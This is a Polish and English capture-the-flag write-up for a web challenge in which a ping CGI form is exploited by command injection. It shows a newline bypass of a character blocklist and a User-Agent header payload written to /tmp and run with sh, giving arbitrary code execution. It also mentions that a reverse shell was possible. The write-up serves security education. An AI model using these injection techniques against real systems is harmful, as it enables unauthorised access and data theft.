﻿##smartcat (web, 50+50p)

###pl
[eng](#eng-version)

w zadaniu dostajemy do dyspozycji webowy interfejs (cgi) pozwalający pignować wskazanego hosta. 
domyślamy się, że pod spodem operacja jest realizowana jako wywołanie `ping` w shellu z doklejonym podanym przez nas adresem.

#### smartcat1

pierwsza część zadania polega na odczytaniu flagi znajdującej się w nieznanym pliku, więc wymaga od nas jedynie możliwości czytania plików.
operatory:

	$;&|({` \t 

są zablokowane, ale zauważamy, że znak nowej linii `\n` jest wyjątkiem.
możemy dzięki temu wykonać dowolną komendę podając na wejściu np.

`localhost%0als`

co zostanie potraktowane jako 2 osobne komendy - `ping localhost` oraz `ls`

wywołanie `ls` pozwala stwierdzić, że w bierzącym katalogu jest katalog `there`, ale nie mamy możliwości listować go bez użycia spacji. po chwili namysłu wpadliśmy na pomysł żeby użyć programu `find` który dał nam:

```
.
./index.cgi
./there
./there/is
./there/is/your
./there/is/your/flag
./there/is/your/flag/or
./there/is/your/flag/or/maybe
./there/is/your/flag/or/maybe/not
./there/is/your/flag/or/maybe/not/what
./there/is/your/flag/or/maybe/not/what/do
./there/is/your/flag/or/maybe/not/what/do/you
./there/is/your/flag/or/maybe/not/what/do/you/think
./there/is/your/flag/or/maybe/not/what/do/you/think/really
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag
```

pozostało nam tylko wywołać `cat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag` i uzyskać flagę:

`ins{warm_kitty_smelly_kitty_flush_flush_flush}`

#### smartcat2

druga część zadania jest trudniejsza, ponieważ treść sugeruje, że musimy odczytać flagę przez coś znajdującego się w katalogu `/home/smartcat/` oraz, że potrzebny będzie do tego shell.
zauważamy po pewnym czasie, że możemy tworzyć pliki w katalogu `/tmp`. 
możemy także uruchamiać skrypty shell przez `sh<script.sh`, ale nadal mieliśmy problem z tym, jak umieścić w skrypcie interesującą nas zawartość.
wreszcie wpadliśmy na to, że istnieją pewne zmienne, na których zawartość możemy wpłynąć - nagłówki http.
w szczególności możemy w dowolny sposób ustawić swój `user-agent`. 
następnie możemy zawartość zmiennych środowiskowych wypisać przez `env` a wynik tej operacji zrzucić do pliku w `tmp`, a potem uruchomić przez `sh</tmp/ourfile`.

pierwsza próba zawierająca user-agent: `a; echo "koty" >/tmp/msm123; a` zakończyła się sukcesem. 

mogliśmy więc z powodzeniem wykonać dowolny kod, w tym użyć `nc` lub `pythona` do postawienia reverse-shell. zamiast tego najpierw wylistowaliśmy katalog `/home/smartcat/` znajdując tam program `readflag`, który przed podaniem flagi wymagał uruchomienia, odczekania kilku sekund i przesłania komunikatu.
wysłaliśmy więc na serwer skrypt, który wykonywał właśnie te czynności z podanym programem i dostaliśmy:

	flag:
				___
			.-"; ! ;"-.
		  .'!  : | :  !`.
		 /\  ! : ! : !  /\
		/\ |  ! :|: !  | /\
	   (  \ \ ; :!: ; / /  )
	  ( `. \ | !:|:! | / .' )
	  (`. \ \ \!:|:!/ / / .')
	   \ `.`.\ |!|! |/,'.' /
		`._`.\\\!!!// .'_.'
		   `.`.\\|//.'.'
			|`._`n'_.'|  hjw
			"----^----"

`ins{shells_are _way_better_than_cats}`

###eng version

in the task we get a web interface (cgi) for pinging selected host.
we predict that underneath this is calling `ping` from shell with adress we give.

#### smartcat1-eng

first part of the task requires reading a flag residing in an unknown file, so we only need to be able to read files.
in the web interface characters 
	
	$;&|({` \t

are blocked, but we notice that newline character `\n` or `%0a` is an exception.
thanks to that we can execute any command we want by using input:

`localhost%0als`

this will be executed as 2 separate commands - `ping localhost` and `ls`

calling `ls` shows us that in currend directory there is a `there` directory, but we can't list it since we can't use space. after a while we figure that we could use `find` which gived us:

	.
	./index.cgi
	./there
	./there/is
	./there/is/your
	./there/is/your/flag
	./there/is/your/flag/or
	./there/is/your/flag/or/maybe
	./there/is/your/flag/or/maybe/not
	./there/is/your/flag/or/maybe/not/what
	./there/is/your/flag/or/maybe/not/what/do
	./there/is/your/flag/or/maybe/not/what/do/you
	./there/is/your/flag/or/maybe/not/what/do/you/think
	./there/is/your/flag/or/maybe/not/what/do/you/think/really
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag


we call: `cat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag` and get flag:

`ins{warm_kitty_smelly_kitty_flush_flush_flush}`

#### smartcat2-eng

second part is more difficult, since we task suggests we need to get the flag using something in `/home/smartcat/` dir and that we will need a shell for that.
after some work we notice that we can create files in `/tmp`.
we can also call shellscripts by `sh<scrupt.sh`, but we still didn't know how to place data we want inside the file.
finally we figured that there are some environmental variables that we can set - http headers.
in particular we can set `user-agent` to any value we want.
we can then list those variables by `env` and save result of this operation to a file in `/tmp` and then run with `sh</tmp/ourfile`.

first attempt containing: `a; echo "koty" >/tmp/msm123; a` was successful.

therefore, we could execute any code, including using `nc` or `python` to set a reverse-shell. instead we started with listing `/home/smartcat/` directory, finding `readflag` binary, which requires us to execute it, wait few seconds and then send some message to get the flag.
instead of the shell we simply sent a script which was doing exactly what `readflag` wanted and we got:

	flag:
				___
			.-"; ! ;"-.
		  .'!  : | :  !`.
		 /\  ! : ! : !  /\
		/\ |  ! :|: !  | /\
	   (  \ \ ; :!: ; / /  )
	  ( `. \ | !:|:! | / .' )
	  (`. \ \ \!:|:!/ / / .')
	   \ `.`.\ |!|! |/,'.' /
		`._`.\\\!!!// .'_.'
		   `.`.\\|//.'.'
			|`._`n'_.'|  hjw
			"----^----"

`ins{shells_are _way_better_than_cats}`
